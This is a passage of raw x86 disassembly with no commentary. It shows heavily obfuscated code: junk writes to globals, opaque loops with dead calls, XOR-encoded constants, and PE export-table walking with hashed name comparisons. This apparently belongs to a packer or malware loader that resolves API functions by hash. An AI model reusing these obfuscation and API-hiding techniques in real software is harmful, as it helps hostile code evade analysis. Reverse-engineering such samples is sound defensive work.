  42353a:	cmp    DWORD PTR ds:0x42a2ba,0x1e
  423541:	jb     0x423505
  423547:	lea    eax,[ebp-0xc]
  42354a:	xor    ecx,ecx
  42354c:	mov    DWORD PTR [ebp-0x14],eax
  42354f:	or     eax,DWORD PTR ds:0x42a25e
  423555:	mov    eax,DWORD PTR [ebp-0xc]
  423558:	and    DWORD PTR ds:0x42a2da,ebx
  42355e:	mov    edx,DWORD PTR [ebp-0x14]
  423561:	mov    DWORD PTR ds:0x42a2a6,0x55c4
  42356b:	mov    ecx,0x75108aa
  423570:	xor    eax,ecx
  423572:	sub    DWORD PTR ds:0x42a26a,0x3296
  42357c:	add    eax,0x3272f1
  423581:	mov    DWORD PTR [edx],eax
  423583:	add    edx,eax
  423585:	mov    eax,ds:0x429296
  42358a:	mov    DWORD PTR ds:0x42a2da,0x12
  423594:	cmp    DWORD PTR ds:0x42a2da,0x0
  42359b:	je     0x4235ef
  4235a1:	cmp    DWORD PTR ds:0x42a2da,0x5
  4235a8:	jb     0x4235ef
  4235ae:	jmp    0x4235c3
  4235b3:	push   0x471b
  4235b8:	push   0x42a2a6
  4235bd:	call   DWORD PTR ds:0x42a3fa
  4235c3:	cmp    DWORD PTR ds:0x42a2da,0x6
  4235ca:	jne    0x4235dd
  4235d0:	mov    edx,DWORD PTR ds:0x42a2da
  4235d6:	dec    edx
  4235d7:	mov    DWORD PTR ds:0x42a2da,edx
  4235dd:	mov    edx,DWORD PTR ds:0x42a2da
  4235e3:	dec    edx
  4235e4:	mov    DWORD PTR ds:0x42a2da,edx
  4235ea:	jmp    0x423594
  4235ef:	mov    edx,DWORD PTR [ebp-0x4]
  4235f2:	mov    eax,DWORD PTR [eax]
  4235f4:	add    eax,DWORD PTR [edx]
  4235f6:	sub    DWORD PTR ds:0x42a2da,ebx
  4235fc:	push   esi
  4235fd:	sub    edx,edx
  4235ff:	mov    DWORD PTR [ebp-0x8],eax
  423602:	mov    edx,DWORD PTR [ebp+0x8]
  423605:	mov    eax,ds:0x42941e
  42360a:	mov    eax,DWORD PTR [eax+0x198]
  423610:	xor    edx,ecx
  423612:	or     DWORD PTR ds:0x42a2ca,ebx
  423618:	mov    esi,0x3272f1
  42361d:	adc    DWORD PTR ds:0x42a262,0x42a296
  423627:	add    edx,esi
  423629:	mov    DWORD PTR ds:0x42a2ae,0x33f
  423633:	cmp    DWORD PTR [eax],edx
  423635:	mov    DWORD PTR ds:0x42a29e,0x6ec0
  42363f:	je     0x423660
  423645:	mov    DWORD PTR ds:0x42a2d2,0x6d4b
  42364f:	mov    eax,DWORD PTR [eax]
  423651:	mov    DWORD PTR ds:0x42a296,0x79fc
  42365b:	jmp    0x423a85
  423660:	mov    eax,DWORD PTR [ebp+0x18]
  423663:	xor    eax,ecx
  423665:	and    DWORD PTR ds:0x42a27a,0x42a26a
  42366f:	push   ebx
  423670:	and    DWORD PTR ds:0x42a2c2,0x0
  42367a:	jmp    0x42368e
  42367f:	xor    ebx,ebx
  423681:	xor    ebx,DWORD PTR ds:0x42a2c2
  423687:	inc    ebx
  423688:	mov    DWORD PTR ds:0x42a2c2,ebx
  42368e:	cmp    DWORD PTR ds:0x42a2c2,0x1b
  423695:	jae    0x4236bb
  42369b:	cmp    DWORD PTR ds:0x42a2c2,0x26
  4236a2:	jb     0x4236bb
  4236a8:	jmp    0x4236b6
  4236ad:	push   DWORD PTR [ebp-0x20]
  4236b0:	call   DWORD PTR ds:0x42a3c6
  4236b6:	jmp    0x42367f
  4236bb:	add    eax,esi
  4236bd:	sub    ebx,DWORD PTR ds:0x42a266
  4236c3:	xor    edx,edx
  4236c5:	mov    ebx,0xfabdbed8
  4236ca:	and    DWORD PTR ds:0x42a302,0x5581
  4236d4:	add    eax,ebx
  4236d6:	push   edi
  4236d7:	mov    DWORD PTR ds:0x42a2de,0x181
  4236e1:	adc    edx,0xffffffff
  4236e4:	movzx  edi,BYTE PTR ds:0x42a2fa
  4236eb:	adc    DWORD PTR ds:0x42a2d2,edi
  4236f1:	mov    edi,0x8a29a13d
  4236f6:	xor    eax,edi
  4236f8:	xor    edx,0x0
  4236fb:	cmp    eax,0x70941fe5
  423700:	jne    0x423723
  423706:	cmp    edx,0xffffffff
  423709:	mov    DWORD PTR ds:0x42a2d6,0x6011
  423713:	jne    0x423723
  423719:	push   0xf89c85ba
  42371e:	jmp    0x423a72
  423723:	mov    eax,DWORD PTR [ebp+0x18]
  423726:	xor    eax,ecx
  423728:	adc    DWORD PTR ds:0x42a29a,0x42a2d6
  423732:	add    eax,esi
  423734:	mov    DWORD PTR ds:0x42a2f2,0x535
  42373e:	xor    edx,edx
  423740:	xor    DWORD PTR ds:0x42a2de,0x42a286
  42374a:	add    eax,ebx
  42374c:	adc    edx,0xffffffff
  42374f:	xor    eax,edi
  423751:	xor    edx,0x0
  423754:	mov    DWORD PTR ds:0x42a26a,0x15dc
  42375e:	cmp    eax,0x70941fe7
  423763:	mov    DWORD PTR ds:0x42a2da,0x1950
  42376d:	jne    0x423a5f
  423773:	mov    DWORD PTR ds:0x42a2a2,0x37f9
  42377d:	cmp    edx,0xffffffff
  423780:	jne    0x423a5f
  423786:	add    edx,DWORD PTR ds:0x42a286
  42378c:	mov    eax,DWORD PTR [ebp+0x10]
  42378f:	movzx  edx,WORD PTR ds:0x42a2da
  423796:	xor    DWORD PTR ds:0x42a2f6,edx
  42379c:	xor    eax,ecx
  42379e:	add    DWORD PTR ds:0x42a292,0x42a302
  4237a8:	add    eax,esi
  4237aa:	mov    DWORD PTR [ebp-0x18],eax
  4237ad:	mov    eax,DWORD PTR [ebp+0xc]
  4237b0:	mov    edx,DWORD PTR [ebp-0x8]
  4237b3:	xor    eax,ecx
  4237b5:	add    eax,esi
  4237b7:	xor    DWORD PTR ds:0x42a2be,0x55ef
  4237c1:	imul   eax,DWORD PTR [edx]
  4237c4:	mov    DWORD PTR ds:0x42a296,0x1045
  4237ce:	mov    edx,DWORD PTR [ebp+0x8]
  4237d1:	sub    DWORD PTR ds:0x42a2f6,0x3ea4
  4237db:	xor    edx,ecx
  4237dd:	adc    DWORD PTR ds:0x42a2e2,0x475c
  4237e7:	add    edx,esi
  4237e9:	mov    DWORD PTR ds:0x42a2be,0x342
  4237f3:	cmp    edx,eax
  4237f5:	mov    DWORD PTR ds:0x42a2b6,0x7ea6
  4237ff:	mov    eax,DWORD PTR [ebp-0x4]
  423802:	je     0x4238dc
  423808:	mov    edx,DWORD PTR [ebp-0x18]
  42380b:	sub    DWORD PTR ds:0x42a2aa,0x2e10
  423815:	add    DWORD PTR [eax],edx
  423817:	xor    DWORD PTR ds:0x42a2c6,ebx
  42381d:	mov    eax,DWORD PTR [ebp-0x4]
  423820:	mov    edx,DWORD PTR ds:0x42a27e
  423826:	and    DWORD PTR ds:0x42a2ee,edx
  42382c:	mov    edx,DWORD PTR [ebp+0xc]
  42382f:	or     DWORD PTR ds:0x42a2c6,0x42a2ea
  423839:	xor    edx,ecx
  42383b:	xor    DWORD PTR ds:0x42a2a2,0x2c59
  423845:	add    edx,esi
  423847:	add    DWORD PTR ds:0x42a25a,0x1203
  423851:	imul   edx,DWORD PTR [eax]
  423854:	mov    DWORD PTR [eax],edx
  423856:	mov    eax,DWORD PTR [ebp-0x4]
  423859:	mov    DWORD PTR [ebp-0x1c],eax
  42385c:	and    DWORD PTR ds:0x42a2de,0x0
  423866:	jmp    0x423876
  42386b:	mov    eax,ds:0x42a2de
  423870:	inc    eax
  423871:	mov    ds:0x42a2de,eax
  423876:	cmp    DWORD PTR ds:0x42a2de,0x1a
  42387d:	jae    0x4238c8
  423883:	cmp    DWORD PTR ds:0x42a2de,0xc
  42388a:	jl     0x4238c8
  423890:	jmp    0x4238a8
  423895:	push   DWORD PTR [ebp-0x10]
  423898:	push   0x1
  42389a:	push   DWORD PTR [ebp-0x24]
  42389d:	push   0x429153
  4238a2:	call   DWORD PTR ds:0x42a3ca
  4238a8:	cmp    DWORD PTR ds:0x42a2de,0xb
  4238af:	jne    0x4238c3
  4238b5:	xor    eax,eax
  4238b7:	xor    eax,DWORD PTR ds:0x42a2de
  4238bd:	inc    eax
  4238be:	mov    ds:0x42a2de,eax
  4238c3:	jmp    0x42386b
  4238c8:	mov    eax,DWORD PTR [ebp+0x10]
  4238cb:	xor    eax,ecx
  4238cd:	mov    edx,0xffcd8d0f
  4238d2:	sub    edx,eax
  4238d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4238d7:	jmp    0x4238f6
  4238dc:	mov    edx,DWORD PTR [ebp+0x14]
  4238df:	xor    DWORD PTR [eax],edx
  4238e1:	mov    eax,DWORD PTR [ebp-0x4]
  4238e4:	mov    DWORD PTR [ebp-0x1c],eax
  4238e7:	mov    eax,DWORD PTR [ebp+0x10]
  4238ea:	xor    eax,ecx
  4238ec:	mov    edx,0xffcd8d0f
  4238f1:	sub    edx,eax
  4238f3:	mov    eax,DWORD PTR [ebp-0x1c]
  4238f6:	add    DWORD PTR [eax],edx
  4238f8:	mov    eax,DWORD PTR [ebp-0x4]
  4238fb:	mov    edx,DWORD PTR [ebp-0x8]
  4238fe:	add    edx,DWORD PTR [eax]
  423900:	mov    DWORD PTR [ebp-0x8],edx
  423903:	mov    eax,DWORD PTR [ebp+0xc]
  423906:	mov    edx,DWORD PTR [ebp+0xc]
  423909:	xor    edx,ecx
  42390b:	xor    eax,ecx
  42390d:	lea    eax,[eax+edx*1+0x64e5e2]
  423914:	mov    edx,DWORD PTR [ebp+0xc]
  423917:	xor    edx,ecx
  423919:	add    edx,esi
  42391b:	imul   eax,edx
  42391e:	mov    edx,DWORD PTR [ebp+0xc]
  423921:	xor    edx,ecx
  423923:	sub    edx,eax
  423925:	mov    eax,DWORD PTR [ebp-0x4]
  423928:	add    edx,esi
  42392a:	cmp    DWORD PTR [eax],edx
  42392c:	mov    eax,DWORD PTR [ebp-0x4]
  42392f:	jg     0x42394c
  423935:	mov    DWORD PTR [ebp-0x1c],eax
  423938:	mov    eax,DWORD PTR [ebp+0x10]
  42393b:	xor    eax,ecx
  42393d:	mov    edx,0xffcd8d0f
  423942:	sub    edx,eax
  423944:	mov    eax,DWORD PTR [ebp-0x1c]
  423947:	jmp    0x423953
  42394c:	mov    edx,DWORD PTR [ebp+0x10]
  42394f:	xor    edx,ecx
  423951:	add    edx,esi
  423953:	add    DWORD PTR [eax],edx
  423955:	mov    eax,DWORD PTR [ebp-0x8]
  423958:	mov    edx,DWORD PTR [ebp-0x10]
  42395b:	mov    eax,DWORD PTR [eax]
  42395d:	xor    edx,ecx
  42395f:	add    edx,0x3272f0
  423965:	not    edx
  423967:	and    eax,edx
  423969:	mov    DWORD PTR [ebp-0x4],eax
  42396c:	movsx  eax,BYTE PTR [eax+0x1]
  423970:	cdq    
  423971:	add    eax,ebx
  423973:	adc    edx,0xffffffff
  423976:	xor    eax,edi
  423978:	xor    edx,0x0
  42397b:	cmp    eax,0x70941e0f
  423980:	jne    0x4239b4
  423986:	cmp    edx,0xffffffff
  423989:	jne    0x4239b4
  42398f:	mov    eax,DWORD PTR [ebp-0x4]
  423992:	movsx  eax,BYTE PTR [eax]
  423995:	cdq    
  423996:	add    eax,ebx
  423998:	adc    edx,0xffffffff
  42399b:	xor    eax,edi
  42399d:	xor    edx,0x0
  4239a0:	cmp    eax,0x70941e18
  4239a5:	jne    0x4239b4
  4239ab:	cmp    edx,0xffffffff
  4239ae:	je     0x4239cb
  4239b4:	mov    eax,DWORD PTR [ebp-0x10]
  4239b7:	xor    eax,ecx
  4239b9:	mov    edx,0xffcd8d0f
  4239be:	sub    edx,eax
  4239c0:	add    DWORD PTR [ebp-0x4],edx
  4239c3:	mov    eax,DWORD PTR [ebp-0x4]
  4239c6:	jmp    0x42396c
  4239cb:	mov    eax,DWORD PTR [ebp-0x14]
  4239ce:	mov    eax,DWORD PTR [eax]
  4239d0:	mov    edx,DWORD PTR [ebp-0x4]
  4239d3:	mov    edx,DWORD PTR [edx+0x3c]
  4239d6:	lea    eax,[edx+eax*8+0x78]
  4239da:	mov    edx,DWORD PTR [ebp-0x4]
  4239dd:	mov    eax,DWORD PTR [eax+edx*1]
  4239e0:	mov    DWORD PTR [ebp-0x8],eax
  4239e3:	mov    eax,DWORD PTR [ebp+0x8]
  4239e6:	xor    eax,ecx
  4239e8:	add    eax,esi
  4239ea:	mov    DWORD PTR [ebp-0x14],eax
  4239ed:	mov    eax,DWORD PTR [ebp+0x8]
  4239f0:	mov    edx,DWORD PTR [ebp-0x8]
  4239f3:	xor    eax,ecx
  4239f5:	add    eax,esi
  4239f7:	cmp    edx,eax
  4239f9:	jne    0x423a17
  4239ff:	mov    eax,DWORD PTR [ebp+0xc]
  423a02:	xor    eax,ecx
  423a04:	mov    ecx,DWORD PTR [ebp-0x8]
  423a07:	add    eax,esi
  423a09:	imul   eax,ecx
  423a0c:	mov    DWORD PTR [ebp-0x8],eax
  423a0f:	push   DWORD PTR [ebp+0x18]
  423a12:	jmp    0x423a72
  423a17:	mov    eax,DWORD PTR [ebp-0x8]
  423a1a:	mov    ecx,DWORD PTR [ebp-0x4]
  423a1d:	add    eax,ecx
  423a1f:	mov    DWORD PTR [ebp-0x14],eax
  423a22:	mov    eax,DWORD PTR [ebp-0x14]
  423a25:	mov    eax,DWORD PTR [eax+0xc]
  423a28:	movsx  eax,BYTE PTR [eax+ecx*1]
  423a2c:	cdq    
  423a2d:	add    eax,ebx
  423a2f:	adc    edx,0xffffffff
  423a32:	xor    eax,edi
  423a34:	xor    edx,0x0
  423a37:	cmp    eax,0x70941e1e
  423a3c:	jne    0x423a0f
  423a42:	cmp    edx,0xffffffff
  423a45:	jne    0x423a0f
  423a4b:	mov    eax,ds:0x42941e
  423a50:	mov    eax,DWORD PTR [eax+0x198]
  423a56:	mov    DWORD PTR [eax],ecx
  423a58:	mov    eax,ecx
  423a5a:	jmp    0x423a83
  423a5f:	mov    eax,DWORD PTR [ebp+0x18]
  423a62:	cmp    eax,0xf89c85ba
  423a67:	jne    0x423a83
  423a6d:	push   0xf89c85bb
  423a72:	push   DWORD PTR [ebp+0x14]
  423a75:	push   DWORD PTR [ebp+0x10]
  423a78:	push   DWORD PTR [ebp+0xc]
  423a7b:	push   DWORD PTR [ebp+0x8]
  423a7e:	call   0x42342b
  423a83:	pop    edi
  423a84:	pop    ebx
  423a85:	pop    esi
  423a86:	leave  
  423a87:	ret    0x14
  423a8a:	push   ebp
  423a8b:	mov    ebp,esp
  423a8d:	and    esp,0xfffffff8
  423a90:	add    DWORD PTR ds:0x42a2ae,0x42a2ee
  423a9a:	sub    esp,0x3fc
  423aa0:	add    DWORD PTR ds:0x42a25e,0x42a25a
  423aaa:	push   ebx
  423aab:	mov    DWORD PTR ds:0x42a286,0x16c4
  423ab5:	push   esi
  423ab6:	push   edi
  423ab7:	xor    edi,edi
  423ab9:	adc    DWORD PTR ds:0x42a26e,0x6687
  423ac3:	push   edi
  423ac4:	sbb    DWORD PTR ds:0x42a29a,0x42a2e2
  423ace:	push   edi
  423acf:	and    DWORD PTR ds:0x42a2ca,0x42a2ce
  423ad9:	push   edi
  423ada:	call   DWORD PTR ds:0x42a3d2
  423ae0:	or     DWORD PTR ds:0x42a25a,0x42a2e6
  423aea:	mov    DWORD PTR [esp+0x10],eax
  423aee:	and    DWORD PTR ds:0x42a262,0x1b9a
  423af8:	lea    eax,[esp+0x78]
  423afc:	push   eax
  423afd:	mov    DWORD PTR ds:0x42a2f6,0x43e8
  423b07:	push   0x429542
  423b0c:	call   DWORD PTR ds:0x42a406
  423b12:	mov    DWORD PTR ds:0x42a2ca,0x1192
  423b1c:	cmp    eax,0xffffffff
  423b1f:	mov    DWORD PTR ds:0x42a2ba,0x65ca
  423b29:	je     0x423b36
  423b2f:	xor    eax,eax
  423b31:	jmp    0x424ddb
  423b36:	and    DWORD PTR ds:0x42a2e2,0x0
  423b40:	mov    esi,DWORD PTR ds:0x42a2e2
  423b46:	inc    esi
  423b47:	mov    DWORD PTR ds:0x42a2e2,esi
  423b4d:	cmp    DWORD PTR ds:0x42a2e2,0x23
  423b54:	jle    0x423b91
  423b5a:	jmp    0x423b84
  423b5f:	push   0x42a2aa
  423b64:	push   0x7608
  423b69:	push   0x7b9f
  423b6e:	push   0x619c
  423b73:	push   DWORD PTR [ebp-0x18]
  423b76:	push   DWORD PTR [ebp-0x18]
  423b79:	push   0x2bb2
  423b7e:	call   DWORD PTR ds:0x42a3ce
  423b84:	cmp    DWORD PTR ds:0x42a2e2,0x15
  423b8b:	jb     0x423b40
  423b91:	mov    esi,DWORD PTR ds:0x42a3fe
  423b97:	push   0xf
  423b99:	lea    eax,[esp+0x44]
  423b9d:	add    DWORD PTR ds:0x42a296,0x2da4
  423ba7:	push   eax
  423ba8:	adc    DWORD PTR ds:0x42a25a,0x42a2ce
  423bb2:	push   0x429556
  423bb7:	sub    DWORD PTR ds:0x42a2ca,0x42a2b6
  423bc1:	push   0x42956a
  423bc6:	push   0x42958a
  423bcb:	sbb    DWORD PTR ds:0x42a2ae,0x7a6
  423bd5:	call   esi
  423bd7:	adc    DWORD PTR ds:0x42a2ae,0x6000
  423be1:	imul   eax,eax,0x300000
  423be7:	mov    DWORD PTR ds:0x42a256,0x5b4b
  423bf1:	cmp    eax,0x1b00000
  423bf6:	mov    DWORD PTR ds:0x42a266,0x1101
  423c00:	jne    0x423b2f
  423c06:	lea    eax,[esp+0x1b8]
  423c0d:	sub    DWORD PTR ds:0x42a2c2,0x1046
  423c17:	push   eax
  423c18:	push   0x4295c6
  423c1d:	call   DWORD PTR ds:0x42a402
  423c23:	mov    DWORD PTR ds:0x42a2a6,0x62e7
  423c2d:	cmp    eax,0xffffffff
  423c30:	mov    DWORD PTR ds:0x42a292,0x7202
  423c3a:	jne    0x423b2f
  423c40:	push   DWORD PTR [esp+0x10]
  423c44:	push   edi
  423c45:	and    DWORD PTR ds:0x42a27e,0x42a262
  423c4f:	call   DWORD PTR ds:0x42a3e6
  423c55:	movzx  ecx,BYTE PTR ds:0x42a286
  423c5c:	and    DWORD PTR ds:0x42a2a2,ecx
  423c62:	mov    DWORD PTR [esp+0x30],edi
  423c66:	sub    ecx,0x7aec
  423c6c:	mov    DWORD PTR [esp+0x20],0xf89c85a5
  423c74:	and    DWORD PTR ds:0x42a2be,0x0
  423c7e:	jmp    0x423c92
  423c83:	xor    ebx,ebx
  423c85:	xor    ebx,DWORD PTR ds:0x42a2be
  423c8b:	inc    ebx
  423c8c:	mov    DWORD PTR ds:0x42a2be,ebx
  423c92:	cmp    DWORD PTR ds:0x42a2be,0x1c
  423c99:	jae    0x423cdd
  423c9f:	cmp    DWORD PTR ds:0x42a2be,0x8
  423ca6:	jg     0x423cdd
  423cac:	jmp    0x423cbc
  423cb1:	push   0x433e
  423cb6:	call   DWORD PTR ds:0x42a3d6
  423cbc:	cmp    DWORD PTR ds:0x42a2be,0x7
  423cc3:	jne    0x423cd8
  423cc9:	xor    ebx,ebx
  423ccb:	xor    ebx,DWORD PTR ds:0x42a2be
  423cd1:	inc    ebx
  423cd2:	mov    DWORD PTR ds:0x42a2be,ebx
  423cd8:	jmp    0x423c83
  423cdd:	mov    DWORD PTR [esp+0xc],0xf89c85ba
  423ce5:	lea    eax,[esp+0x3c]
  423ce9:	add    DWORD PTR ds:0x42a25a,ebx
  423cef:	mov    DWORD PTR [esp+0x30],eax
  423cf3:	lea    eax,[esp+0x38]
  423cf7:	mov    DWORD PTR [esp+0x10],eax
  423cfb:	and    ecx,DWORD PTR ds:0x42a2aa
  423d01:	mov    eax,ds:0x42941e
  423d06:	mov    DWORD PTR ds:0x42a2e6,0x11
  423d10:	cmp    DWORD PTR ds:0x42a2e6,0x0
  423d17:	je     0x423d6c
  423d1d:	cmp    DWORD PTR ds:0x42a2e6,0x7
  423d24:	jle    0x423d6c
  423d2a:	jmp    0x423d40
  423d2f:	push   DWORD PTR [ebp-0x28]
  423d32:	push   DWORD PTR [ebp-0x20]
  423d35:	push   0x43b4
  423d3a:	call   DWORD PTR ds:0x42a3da
  423d40:	cmp    DWORD PTR ds:0x42a2e6,0x8
  423d47:	jne    0x423d5a
  423d4d:	mov    ebx,DWORD PTR ds:0x42a2e6
  423d53:	dec    ebx
  423d54:	mov    DWORD PTR ds:0x42a2e6,ebx
  423d5a:	mov    ebx,DWORD PTR ds:0x42a2e6
  423d60:	dec    ebx
  423d61:	mov    DWORD PTR ds:0x42a2e6,ebx
  423d67:	jmp    0x423d10
  423d6c:	mov    eax,DWORD PTR [eax+0x1c8]
  423d72:	movzx  ecx,BYTE PTR ds:0x42a29e
  423d79:	sub    DWORD PTR ds:0x42a286,ecx
  423d7f:	mov    eax,DWORD PTR [eax]
  423d81:	mov    ecx,DWORD PTR [esp+0x10]
  423d85:	movzx  edi,WORD PTR ds:0x42a2b6
  423d8c:	adc    DWORD PTR ds:0x42a2a6,edi
  423d92:	mov    edi,0x75108aa
  423d97:	xor    eax,edi
  423d99:	or     DWORD PTR ds:0x42a2b2,0x565
  423da3:	mov    ebx,0x3272f1
  423da8:	mov    DWORD PTR ds:0x42a272,0x78c3
  423db2:	add    eax,ebx
  423db4:	mov    DWORD PTR ds:0x42a2d2,0x2205
  423dbe:	mov    DWORD PTR [ecx],eax
  423dc0:	mov    eax,0x7be2
  423dc5:	mov    eax,ds:0x42a11a
  423dca:	cmp    eax,0x445cecf9
  423dcf:	jne    0x423ece
  423dd5:	mov    DWORD PTR ds:0x42a2da,0x1f
  423ddf:	cmp    DWORD PTR ds:0x42a2da,0x0
  423de6:	je     0x423e41
  423dec:	cmp    DWORD PTR ds:0x42a2da,0x8
  423df3:	ja     0x423e41
  423df9:	jmp    0x423e19
  423dfe:	push   DWORD PTR [ebp-0xc]
  423e01:	push   0x6d68
  423e06:	push   0x65f4
  423e0b:	push   DWORD PTR [ebp-0x1c]
  423e0e:	push   0x42a292
  423e13:	call   DWORD PTR ds:0x42a3de
  423e19:	cmp    DWORD PTR ds:0x42a2da,0x9
  423e20:	jne    0x423e31
  423e26:	mov    eax,ds:0x42a2da
  423e2b:	dec    eax
  423e2c:	mov    ds:0x42a2da,eax
  423e31:	mov    eax,ds:0x42a2da
  423e36:	dec    eax
  423e37:	mov    ds:0x42a2da,eax
  423e3c:	jmp    0x423ddf
  423e41:	mov    eax,DWORD PTR [esp+0x20]
  423e45:	mov    ecx,DWORD PTR ds:0x42941e
  423e4b:	adc    DWORD PTR ds:0x42a272,0x42a276
  423e55:	mov    ecx,DWORD PTR [ecx+0x198]
  423e5b:	sub    DWORD PTR ds:0x42a266,0x3ba6
  423e65:	xor    eax,edi
  423e67:	add    eax,ebx
  423e69:	sbb    DWORD PTR ds:0x42a286,0x42a266
  423e73:	mov    DWORD PTR [ecx],eax
  423e75:	xor    eax,0x20bc
  423e7a:	mov    eax,DWORD PTR [esp+0x20]
  423e7e:	adc    DWORD PTR ds:0x42a2d2,0x4876
  423e88:	xor    eax,edi
  423e8a:	add    DWORD PTR ds:0x42a2e2,0x2a33
  423e94:	add    eax,ebx
  423e96:	mov    ds:0x42a11a,eax
  423e9b:	movzx  eax,WORD PTR ds:0x42a29a
  423ea2:	sub    eax,DWORD PTR ds:0x42a2da
  423ea8:	mov    ds:0x42a29a,eax
  423ead:	mov    eax,DWORD PTR [esp+0x20]
  423eb1:	and    DWORD PTR ds:0x42a292,0x51c2
  423ebb:	xor    eax,edi
  423ebd:	add    eax,ebx
  423ebf:	or     DWORD PTR ds:0x42a2fa,0x2cb7
  423ec9:	mov    ds:0x429516,eax
  423ece:	sbb    eax,0x6039
  423ed3:	mov    eax,ds:0x42941e
  423ed8:	mov    eax,DWORD PTR [eax+0x18c]
  423ede:	xor    DWORD PTR ds:0x42a2ca,0x42a2ce
  423ee8:	mov    eax,DWORD PTR [eax]
  423eea:	add    DWORD PTR ds:0x42a2f6,0x42a29e
  423ef4:	mov    DWORD PTR [esp+0x60],eax
  423ef8:	and    DWORD PTR ds:0x42a26e,0x0
  423f02:	mov    eax,ds:0x42a26e
  423f07:	inc    eax
  423f08:	mov    ds:0x42a26e,eax
  423f0d:	cmp    DWORD PTR ds:0x42a26e,0x8
  423f14:	jb     0x423f52
  423f1a:	jmp    0x423f2d
  423f1f:	push   DWORD PTR [ebp-0x18]
  423f22:	push   0x42a2a6
  423f27:	call   DWORD PTR ds:0x42a40a
  423f2d:	cmp    DWORD PTR ds:0x42a26e,0x7
  423f34:	jne    0x423f45
  423f3a:	mov    eax,ds:0x42a26e
  423f3f:	inc    eax
  423f40:	mov    ds:0x42a26e,eax
  423f45:	cmp    DWORD PTR ds:0x42a26e,0x16
  423f4c:	jb     0x423f02
  423f52:	mov    eax,0xf89c85b9
  423f57:	and    DWORD PTR ds:0x42a25a,0x42a2ca
  423f61:	mov    DWORD PTR [esp+0x18],eax
  423f65:	mov    DWORD PTR [esp+0x18],eax
  423f69:	mov    DWORD PTR [esp+0x18],eax
  423f6d:	sub    DWORD PTR ds:0x42a26e,0x2657
  423f77:	mov    DWORD PTR [esp+0x18],0xf89c85a5
  423f7f:	mov    DWORD PTR [esp+0x10],eax
  423f83:	mov    DWORD PTR [esp+0x10],0xf89c85bd
  423f8b:	dec    DWORD PTR ds:0x42a2ba
  423f91:	mov    eax,DWORD PTR [esp+0x20]
  423f95:	xor    DWORD PTR ds:0x42a28a,0x42a2de
  423f9f:	xor    eax,edi
  423fa1:	sbb    DWORD PTR ds:0x42a286,0xceb
  423fab:	add    eax,ebx
  423fad:	mov    DWORD PTR ds:0x42a2fe,0x5bbe
  423fb7:	jmp    0x4240fb
  423fbc:	lea    eax,[esp+0x78]
  423fc0:	push   eax
  423fc1:	add    DWORD PTR ds:0x42a26a,0x42a266
  423fcb:	push   0x4295b2
  423fd0:	call   DWORD PTR ds:0x42a406
  423fd6:	cmp    eax,0xffffffff
  423fd9:	mov    DWORD PTR ds:0x42a29a,0x7074
  423fe3:	jne    0x423b2f
  423fe9:	push   0xf
  423feb:	sub    DWORD PTR ds:0x42a2a6,0x5dcc
  423ff5:	lea    eax,[esp+0x44]
  423ff9:	push   eax
  423ffa:	sbb    DWORD PTR ds:0x42a2d2,0x2005
  424004:	push   0x429606
  424009:	sub    DWORD PTR ds:0x42a2be,0x2b2b
  424013:	push   0x42961a
  424018:	add    DWORD PTR ds:0x42a2f2,0x4bf9
  424022:	push   0x42963a
  424027:	call   esi
  424029:	imul   eax,eax,0x300000
  42402f:	cmp    eax,0x1b00000
  424034:	mov    DWORD PTR ds:0x42a2be,0x7b39
  42403e:	jne    0x423b2f
  424044:	adc    DWORD PTR ds:0x42a29e,0x2f79
  42404e:	lea    eax,[esp+0x1b8]
  424055:	xor    DWORD PTR ds:0x42a26a,0x2364
  42405f:	push   eax
  424060:	push   0x429676
  424065:	call   DWORD PTR ds:0x42a402
  42406b:	mov    DWORD PTR ds:0x42a27e,0x2c82
  424075:	cmp    eax,0xffffffff
  424078:	mov    DWORD PTR ds:0x42a2fa,0x479f
  424082:	jne    0x423b2f
  424088:	mov    eax,DWORD PTR [esp+0xc]
  42408c:	mov    ecx,DWORD PTR [esp+0x10]
  424090:	xor    eax,edi
  424092:	add    DWORD PTR ds:0x42a29a,0x71aa
  42409c:	lea    eax,[eax+ecx*1+0x3272f1]
  4240a3:	adc    DWORD PTR ds:0x42a2c6,0x42a292
  4240ad:	push   eax
  4240ae:	mov    eax,DWORD PTR [esp+0x1c]
  4240b2:	or     DWORD PTR ds:0x42a2fa,0x259a
  4240bc:	xor    eax,edi
  4240be:	lea    eax,[ebp+eax*1+0x3272f9]
  4240c5:	push   eax
  4240c6:	xor    DWORD PTR ds:0x42a2aa,0x66c
  4240d0:	mov    eax,ds:0x42941e
  4240d5:	push   DWORD PTR [eax+0x1bc]
  4240db:	and    DWORD PTR ds:0x42a2ce,0x42a27e
  4240e5:	call   0x424de4
  4240ea:	mov    eax,DWORD PTR [esp+0xc]
  4240ee:	mov    ecx,DWORD PTR [esp+0x10]
  4240f2:	xor    eax,edi
  4240f4:	lea    eax,[ecx+eax*1+0x3272f1]
  4240fb:	mov    ecx,DWORD PTR [esp+0xc]
  4240ff:	mov    DWORD PTR ds:0x42a2ea,0x12
  424109:	cmp    DWORD PTR ds:0x42a2ea,0x0
  424110:	je     0x424160
  424116:	cmp    DWORD PTR ds:0x42a2ea,0x2
  42411d:	jbe    0x424160
  424123:	jmp    0x424134
  424128:	push   DWORD PTR [ebp-0x24]
  42412b:	push   DWORD PTR [ebp-0x14]
  42412e:	call   DWORD PTR ds:0x42a3e2
  424134:	cmp    DWORD PTR ds:0x42a2ea,0x3
  42413b:	jne    0x42414e
  424141:	mov    edx,DWORD PTR ds:0x42a2ea
  424147:	dec    edx
  424148:	mov    DWORD PTR ds:0x42a2ea,edx
  42414e:	mov    edx,DWORD PTR ds:0x42a2ea
  424154:	dec    edx
  424155:	mov    DWORD PTR ds:0x42a2ea,edx
  42415b:	jmp    0x424109
  424160:	mov    edx,DWORD PTR [esp+0xc]
  424164:	and    DWORD PTR ds:0x42a2e6,0x42a2a2
  42416e:	xor    edx,edi
  424170:	xor    ecx,edi
  424172:	adc    DWORD PTR ds:0x42a28a,0x42a2b6
  42417c:	add    ecx,edx
  42417e:	mov    edx,DWORD PTR ds:0x42a2ce
  424184:	sbb    edx,DWORD PTR ds:0x42a2e2
  42418a:	mov    DWORD PTR ds:0x42a2ce,edx
  424190:	mov    edx,DWORD PTR [esp+0xc]
  424194:	xor    edx,edi
  424196:	mov    DWORD PTR ds:0x42a27e,0x2a3d
  4241a0:	lea    ecx,[ecx+edx*1+0x9758d3]
  4241a7:	mov    DWORD PTR [esp+0x10],eax
  4241ab:	mov    DWORD PTR ds:0x42a2fa,0x2809
  4241b5:	cmp    eax,ecx
